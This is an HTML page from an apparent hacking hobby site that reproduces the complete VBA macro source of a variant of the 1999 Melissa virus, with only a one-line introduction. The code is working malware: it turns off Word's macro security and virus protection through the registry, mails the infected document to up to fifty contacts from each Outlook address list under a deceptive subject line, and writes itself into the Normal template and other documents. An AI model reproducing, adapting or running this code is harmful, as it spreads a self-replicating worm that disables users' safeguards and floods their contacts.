<HTML>
<HEAD>
<TITLE>"Melissa" virus source code</TITLE>
<META NAME="Generator" CONTENT="Handwritten using JGsoft EditPad">
<META NAME="Author" CONTENT="Valerio Capello 'Elf Qrin'">
<META NAME="Description" CONTENT="This is the source code (in VBS) of the Duke/SMF variant of the virus 'Melissa' written by Kwyjibo, which started spreading on Friday, March 26, 1999.">
</HEAD>
<BODY BACKGROUND="lblbord2b.gif" BGCOLOR="#000000" TEXT="#7777FF" LINK="#9999FF" VLINK="#6622EE" ALINK="#FF0000">
<!-- B EQhdr -->
<CENTER>
<TABLE BORDER=0 CELLPADDING=1 CELLSPACING=1 WIDTH="100%"><TR>
<TD ALIGN=LEFT VALIGN=MIDDLE>
<A HREF="http://www.ElfQrin.com"><IMG SRC="http://www.ElfQrin.com/EQhdr_1.gif" WIDTH="100" HEIGHT="83" BORDER=0 ALT="Elf Qrin's Lair"></A>
</TD>
<TD ALIGN=CENTER VALIGN=MIDDLE>
<FONT FACE="Arial Narrow, Arial">
<!-- B dynad -->
<AD- ME SRC="http://www.ElfQrin.com/dynad/dynad.shtml#a" WIDTH=468 HEIGHT=60 MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=NO>
<SCRIPT LANGUAGE="JavaScript" SRC="http://www.ElfQrin.com/dynad/dynad.js"></SCRIPT>
<NOSCRIPT><A HREF="http://www.ElfQrin.com/dynad/dynadalt.shtml#a" TARGET="ADS"><FONT size=1>[AD]</FONT><AD- ER=0 ALT="CLICK HERE!" src="http://www.ElfQrin.com/dynad/dynadalt.jpg"></A></NOSCRIPT>
<AD- AME>
<!-- E dynad -->
</FONT>
</TD>
<TD ALIGN=RIGHT VALIGN=MIDDLE>
<A HREF="http://www.ElfQrin.com"><IMG SRC="http://www.ElfQrin.com/EQhdr_2.gif" WIDTH="100" HEIGHT="83" BORDER=0 ALT=""></A>
</TD>
</TR></TABLE>
</CENTER>
<P><BR>
<!-- E EQhdr -->
<BLOCKQUOTE>
<FONT FACE="Arial, Verdana" COLOR="#DD9911">
<CENTER>
<FONT SIZE=+2 COLOR="#EE0000">"Melissa" virus source code</FONT>
</CENTER>
<P><BR><BR>
This is the source code (in VBS) of the Duke/SMF variant of the virus "Melissa" written by Kwyjibo, which started spreading on Friday, March 26, 1999.
</FONT>
</BLOCKQUOTE>
<P><BR><BR>
<PRE>
<CODE><XMP>

Private Sub AutoOpen() 
On Error Resume Next 
p$ = "clone" 
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then 
CommandBars("Macro").Controls("Security...").Enabled = False 
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1& 
Else 
p$ = "clone" 
CommandBars("Tools").Controls("Macro").Enabled = False 
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1) 
End If 
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice 
Set UngaDasOutlook = CreateObject("Outlook.Application") 
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI") 
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo" Then 
If UngaDasOutlook = "Outlook" Then 
DasMapiName.Logon "profile", "password" 
For y = 1 To DasMapiName.AddressLists.Count 
Set AddyBook = DasMapiName.AddressLists(y) 
x = 1 
Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0) 
For oo = 1 To AddyBook.AddressEntries.Count 
Peep = AddyBook.AddressEntries(x) 
BreakUmOffASlice.Recipients.Add Peep 
x = x + 1 
If x > 50 Then oo = AddyBook.AddressEntries.Count 
Next oo 
BreakUmOffASlice.Subject = "Important Message From " & Application.UserName 
BreakUmOffASlice.Body = "Here is that document you asked for ... don't show anyone else ;-)" 
BreakUmOffASlice.Attachments.Add ActiveDocument.FullName 
BreakUmOffASlice.Send 
Peep = "" 
Next y 
DasMapiName.Logoff 
End If 
p$ = "clone" 
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") = "... by Kwyjibo" 
End If 
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1) 
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1) 
NTCL = NTI1.CodeModule.CountOfLines 
ADCL = ADI1.CodeModule.CountOfLines 
BGN = 2 
If ADI1.Name <> "Melissa" Then 
If ADCL > 0 Then _ 
ADI1.CodeModule.DeleteLines 1, ADCL 
Set ToInfect = ADI1 
ADI1.Name = "Melissa" 
DoAD = True 
End If 
If NTI1.Name <> "Melissa" Then 
If NTCL > 0 Then _ 
NTI1.CodeModule.DeleteLines 1, NTCL 
Set ToInfect = NTI1 
NTI1.Name = "Melissa" 
DoNT = True 
End If 
If DoNT <> True And DoAD <> True Then GoTo CYA 
If DoNT = True Then 
Do While ADI1.CodeModule.Lines(1, 1) = "" 
ADI1.CodeModule.DeleteLines 1 
Loop 
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()") 
Do While ADI1.CodeModule.Lines(BGN, 1) <> "" 
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1) 
BGN = BGN + 1 
Loop 
End If 
p$ = "clone" 
If DoAD = True Then 
Do While NTI1.CodeModule.Lines(1, 1) = "" 
NTI1.CodeModule.DeleteLines 1 
Loop 
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()") 
Do While NTI1.CodeModule.Lines(BGN, 1) <> "" 
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1) 
BGN = BGN + 1 
Loop 
End If 
CYA: 
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then 
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName 
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then 
ActiveDocument.Saved = True: End If 
'WORD/Melissa written by Kwyjibo 
'Clone written by Duke/SMF 
'Works in both Word 2000 and Word 97 
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide! 
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age! 
If Day(Now) = Minute(Now) Then Selection.TypeText "Twenty-two points, plus triple-word-score, plus fifty points for using all my letters. Game's over. I'm outta here." 
End Sub

</XMP></CODE>
</PRE>
<CENTER>
<P><BR>
<HR>
<A HREF="http://www.ElfQrin.com/hack/"><ADDRESS>Issued on Elf Qrin's Hacking Lab</ADDRESS></A>
<FONT SIZE=-1><A HREF="../disclaimer.html">Legal notices and disclaimer</A></FONT>
</FONT>
</CENTER>
<P ALIGN=RIGHT>
<!-- Start of TheCounter.com Code -->
<SCRIPT><!--
s="na";c="na";j="na";f=""+escape(document.referrer)
//--></SCRIPT>
<SCRIPT language="javascript1.2"><!--
s=screen.width;v=navigator.appName
if (v != "Netscape") {c=screen.colorDepth}
else {c=screen.pixelDepth}
j=navigator.javaEnabled()
//--></SCRIPT>
<SCRIPT><!--
function pr(n) {document.write(n,"\n");}
NS2Ch=0
if (navigator.appName == "Netscape" &&
navigator.appVersion.charAt(0) == "2") {NS2Ch=1}
if (NS2Ch == 0) {
r="&size="+s+"&colors="+c+"&referer="+f+"&java="+j+""
pr("<A HREF=\"http://www.TheCounter.com\" TARGET=\"_top\"><IMG")
pr("BORDER=0 SRC=\"http://c2.thecounter.com/id=1064368"+r+"\"></A>")}
//--></SCRIPT>
<NOSCRIPT><A HREF="http://www.TheCounter.com" TARGET="_top"><IMG
SRC="http://c2.thecounter.com/id=1064368" ALT="TheCounter" BORDER=0></A>
</NOSCRIPT>
<!-- End of TheCounter.com Code -->
</BODY>
</HTML>
